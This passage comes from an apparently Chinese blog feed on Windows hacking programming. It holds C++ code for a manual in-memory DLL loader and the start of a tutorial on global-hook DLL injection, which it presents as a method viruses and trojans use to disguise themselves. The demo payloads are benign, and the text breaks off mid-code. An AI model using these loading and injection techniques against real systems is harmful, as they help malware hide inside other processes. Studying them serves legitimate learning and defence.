例如 1000节需要修正5个重定位数据的话，重定位表的数据是</span><br><span class="hljs-comment">// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000</span><br><span class="hljs-comment">// -----------   -----------      ----</span><br><span class="hljs-comment">// 给出节的偏移  总尺寸=8+6*2     需要修正的地址           用于对齐4字节</span><br><span class="hljs-comment">// 重定位表是若干个相连，如果address 和 size都是0 表示结束</span><br><span class="hljs-comment">// 需要修正的地址是12位的，高4位是形态字，intel cpu下是3</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//假设NewBase是0x600000,而文件中设置的缺省ImageBase是0x400000,则修正偏移量就是0x200000</span><br><span class="hljs-comment">//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址</span><br><br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br><br><span class="hljs-comment">// 判断是否有 重定位表</span><br><span class="hljs-keyword">if</span> ((PVOID)pLoc == (PVOID)pDosHeader)<br>&#123;<br><span class="hljs-comment">// 重定位表 为空</span><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-keyword">while</span> ((pLoc-&gt;VirtualAddress + pLoc-&gt;SizeOfBlock) != <span class="hljs-number">0</span>) <span class="hljs-comment">//开始扫描重定位表</span><br>&#123;<br>WORD* pLocData = (WORD*)((PBYTE)pLoc + <span class="hljs-built_in">sizeof</span>(IMAGE_BASE_RELOCATION));<br><span class="hljs-comment">//计算本节需要修正的重定位项（地址）的数目</span><br><span class="hljs-type">int</span> nNumberOfReloc = (pLoc-&gt;SizeOfBlock - <span class="hljs-built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-built_in">sizeof</span>(WORD);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nNumberOfReloc; i++)<br>&#123;<br><span class="hljs-comment">// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。</span><br><span class="hljs-comment">// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#ifdef _WIN64</span><br><span class="hljs-comment">if ((DWORD)(pLocData[i] &amp; 0x0000F000) == 0x0000A000)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">// 64位dll重定位，IMAGE_REL_BASED_DIR64</span><br><span class="hljs-comment">// 对于IA-64的可执行文件，重定位似乎总是IMAGE_REL_BASED_DIR64类型的。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">ULONGLONG* pAddress = (ULONGLONG *)((PBYTE)pNewBase + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; 0x0FFF));</span><br><span class="hljs-comment">ULONGLONG ullDelta = (ULONGLONG)pNewBase - m_pNTHeader-&gt;OptionalHeader.ImageBase;</span><br><span class="hljs-comment">*pAddress += ullDelta;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">#endif</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="hljs-number">0x0000F000</span>) == <span class="hljs-number">0x00003000</span>) <span class="hljs-comment">//这是一个需要修正的地址</span><br>&#123;<br><span class="hljs-comment">// 32位dll重定位，IMAGE_REL_BASED_HIGHLOW</span><br><span class="hljs-comment">// 对于x86的可执行文件，所有的基址重定位都是IMAGE_REL_BASED_HIGHLOW类型的。</span><br><br>DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="hljs-number">0x0FFF</span>));<br>DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase;<br>*pAddress += dwDelta;<br><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//转移到下一个节进行处理</span><br>pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock);<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><span class="hljs-comment">// 填写PE文件导入表信息</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">DoImportTable</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader +<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);<br><br><span class="hljs-comment">// 循环遍历DLL导入表中的DLL及获取导入表中的函数地址</span><br><span class="hljs-type">char</span>* lpDllName = <span class="hljs-literal">NULL</span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportNameArray = <span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="hljs-literal">NULL</span>;<br>PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="hljs-literal">NULL</span>;<br>FARPROC lpFuncAddress = <span class="hljs-literal">NULL</span>;<br>DWORD i = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pImportTable-&gt;OriginalFirstThunk)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 获取导入表中DLL的名称并加载DLL</span><br>lpDllName = (<span class="hljs-type">char</span>*)((DWORD)pDosHeader + pImportTable-&gt;Name);<br>hDll = ::<span class="hljs-built_in">GetModuleHandle</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll)<br>&#123;<br>hDll = ::<span class="hljs-built_in">LoadLibrary</span>(lpDllName);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll)<br>&#123;<br>pImportTable++;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span><br>lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk);<br><span class="hljs-comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span><br>lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk);<br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == lpImportNameArray[i].u1.AddressOfData)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// 获取IMAGE_IMPORT_BY_NAME结构</span><br>lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData);<br><br><span class="hljs-comment">// 判断导出函数是序号导出还是函数名称导出</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal)<br>&#123;<br><span class="hljs-comment">// 序号导出</span><br><span class="hljs-comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span><br>lpFuncAddress = ::<span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="hljs-number">0x0000FFFF</span>));<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">// 名称导出</span><br>lpFuncAddress = ::<span class="hljs-built_in">GetProcAddress</span>(hDll, (LPCSTR)lpImportByName-&gt;Name);<br>&#125;<br><span class="hljs-comment">// 注意此处的函数地址表的赋值，要对照PE格式进行装载，不要理解错了！！！</span><br>lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress;<br>i++;<br>&#125;<br><br>pImportTable++;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><span class="hljs-comment">// 修改PE文件加载基址IMAGE_NT_HEADERS.OptionalHeader.ImageBase</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetImageBase</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span><br><span class="hljs-function"></span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>pNtHeaders-&gt;OptionalHeader.ImageBase = (ULONG32)lpBaseAddress;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br><span class="hljs-comment">// 调用DLL的入口函数DllMain,函数地址即为PE文件的入口点IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">CallDllMain</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span><br><span class="hljs-function"></span>&#123;<br>typedef_DllMain DllMain = <span class="hljs-literal">NULL</span>;<br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);<br><span class="hljs-comment">// 调用入口函数,附加进程DLL_PROCESS_ATTACH</span><br>BOOL bRet = <span class="hljs-built_in">DllMain</span>((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (FALSE == bRet)<br>&#123;<br><span class="hljs-built_in">ShowError</span>(<span class="hljs-string">&quot;DllMain&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br><br><br><span class="hljs-comment">// 模拟GetProcAddress获取内存DLL的导出函数</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL文件加载到进程中的加载基址</span><br><span class="hljs-comment">// lpszFuncName: 导出函数的名字</span><br><span class="hljs-comment">// 返回值: 返回导出函数的的地址</span><br><span class="hljs-function">LPVOID <span class="hljs-title">MmGetProcAddress</span><span class="hljs-params">(LPVOID lpBaseAddress, PCHAR lpszFuncName)</span></span><br><span class="hljs-function"></span>&#123;<br>LPVOID lpFunc = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">// 获取导出表</span><br>PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;<br>PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);<br>PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><span class="hljs-comment">// 获取导出表的数据</span><br>PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames);<br>PCHAR lpFuncName = <span class="hljs-literal">NULL</span>;<br>PWORD lpAddressOfNameOrdinalsArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals);<br>WORD wHint = <span class="hljs-number">0</span>;<br>PDWORD lpAddressOfFunctionsArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions);<br><br>DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames;<br>DWORD i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 遍历导出表的导出函数的名称, 并进行匹配</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; dwNumberOfNames; i++)<br>&#123;<br>lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == ::<span class="hljs-built_in">lstrcmpi</span>(lpFuncName, lpszFuncName))<br>&#123;<br><span class="hljs-comment">// 获取导出函数地址</span><br>wHint = lpAddressOfNameOrdinalsArray[i];<br>lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFunctionsArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br><br><br><span class="hljs-comment">// 释放从内存加载的DLL到进程内存的空间</span><br><span class="hljs-comment">// lpBaseAddress: 内存DLL数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span><br><span class="hljs-comment">// 返回值: 成功返回TRUE，否则返回FALSE</span><br><span class="hljs-function">BOOL <span class="hljs-title">MmFreeLibrary</span><span class="hljs-params">(LPVOID lpBaseAddress)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL bRet = FALSE;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == lpBaseAddress)<br>&#123;<br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br><br>bRet = <span class="hljs-built_in">VirtualFree</span>(lpBaseAddress, <span class="hljs-number">0</span>, MEM_RELEASE);<br>lpBaseAddress = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>TestDll.dll</strong>(待加载DLL文件)<br> dllmain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>TestDll.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function">BOOL <span class="hljs-title">ShowMessage</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpszText, <span class="hljs-type">char</span>* lpszCaption)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, lpszText, lpszCaption, MB_OK);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a><strong>测试</strong></h4><p><img src="/2022/10/31/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/image-20221031103323202.png" alt="image-20221031103323202"></p>]]></content>
    
    
    <categories>
      
      <category>Windows黑客编程技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术</title>
    <link href="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="第三章-注入技术"><a href="#第三章-注入技术" class="headerlink" title="第三章  注入技术"></a>第三章  注入技术</h2><p>为了方便对目标进程空间数据进行修改，或者戴上目标进程的“面具”进行伪装，病毒木马需要将执行的Shellcode或者DLL注入到目标进程中去执行，其中DLL注入最为普遍。</p><p>这是因为DLL不需要像Shellcode那样要获取kernel32.dll加载基址并根据导出表获取导出函数地址。若DLL成功注入，则表示DLL已成功加载到目标进程空间中，其导入表、导出表、重定位表等均已加载和修改完毕，DLL中的代码可以正常执行。</p><h3 id="全局钩子注入"><a href="#全局钩子注入" class="headerlink" title="全局钩子注入"></a><strong>全局钩子注入</strong></h3><h4 id="关于钩子"><a href="#关于钩子" class="headerlink" title="关于钩子"></a>关于钩子</h4><p>在Windows中大部分的应用程序都是基于消息机制的，它们都有一个消息过程函数，根据不同的消息完成不同的功能。Windows操作系统提供的钩子机制就是用来截获和监视系统中这些消息的。</p><p>按照钩子作用的范围不同，它们又可以分为局部钩子和全局钩子。局部钩子是针对某个线程的；而全局钩子则是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL中实现相应的钩子函数。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>由上述介绍可以知道，<strong>如果创建的是全局钩子，那么钩子函数必须在一个DLL中</strong>。这是因为进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子函数的实现代码在DLL中，则在对应事件发生时，系统会把这个DLL加载到发生事件<br>的进程地址空间中，使它能够调用钩子函数进行处理。</p><p><strong>在操作系统中安装全局钩子后，只要进程接收到可以发出钩子的消息，全局钩子的DLL文件就会由操作系统自动或强行地加载到该进程中</strong>。因此，设置全局钩子可以达到DLL注入的目的。创建一个全局钩子后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中这样，便实现了DLL注人。</p><p>为了能够让DLL注入到所有的进程中，程序设置WH_GETMESSAGE消息的全局钩子。因为WH_GETMESSAGE类型的钩子会监视消息队列，并且WindoWs系统是基于消息驱动的，所以所有进程都会有自已的一个消息队列，都会加载WHGETMESSAGE类型的全局钩子DLL。</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p><strong>项目结构</strong></p><p><img src="/2022/10/27/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/image-20221025151000138.png" alt="image-20221025151000138"></p><p><strong>ConsoleApplication3.cpp</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[]) &#123;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(*typedef_SetGlobalHook)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(*typedef_UnsetGlobalHook)</span><span class="hljs-params">()</span></span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>typedef_SetGlobalHook SetGlobalHook = <span class="hljs-literal">NULL</span>;<br>typedef_UnsetGlobalHook UnsetGlobalHook = <span class="hljs-literal">NULL</span>;<br>BOOL bRet = FALSE;<br><br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = <span class="hljs-built_in">LoadLibraryW</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Dll1.dll&quot;</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LoadLibrary Error[%d]\n&quot;</span>, ::<span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br>SetGlobalHook = (typedef_SetGlobalHook)::<span class="hljs-built_in">GetProcAddress</span>(hDll, <span class="hljs-string">&quot;SetGlobalHook&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == SetGlobalHook)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br>bRet = <span class="hljs-built_in">SetGlobalHook</span>();<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SetGlobalHook OK.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SetGlobalHook ERROR.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br>UnsetGlobalHook = (typedef_UnsetGlobalHook)::<span class="hljs-built_in">GetProcAddress</span>(hDll, <span class="hljs-string">&quot;UnsetGlobalHook&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == UnsetGlobalHook)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">UnsetGlobalHook</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UnsetGlobalHook OK.\n&quot;</span>);<br><br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>dllmain.cpp</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><br>HMODULE g_hDllModule = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br>g_hDllModule = hModule;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>export.cpp</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;framework.h&quot;</span></span><br><span class="hljs-keyword">extern</span> HMODULE g_hDllModule;<br><span class="hljs-comment">// 共享内存</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;mydata&quot;</span>)</span><br>HHOOK g_hHook = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>__declspec(dllexport) <span class="hljs-function">LRESULT <span class="hljs-title">GetMsgProc</span><span class="hljs-params">(<span class="hljs-type">int</span> code,WPARAM wParam,LPARAM lParam)</span></span>;<br>__declspec(dllexport) <span class="hljs-function">BOOL <span class="hljs-title">SetGlobalHook</span><span class="hljs-params">()</span></span>;<br>__declspec(dllexport) <span class="hljs-function">BOOL <span class="hljs-title">UnsetGlobalHook</span><span class="hljs-params">()</span></span>;<br>&#125;<br><span class="hljs-comment">// 钩子回调函数</span><br><span class="hljs-function">LRESULT <span class="hljs-title">GetMsgProc</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">int</span> code,</span></span><br><span class="hljs-params"><span class="hljs-function">WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">LPARAM 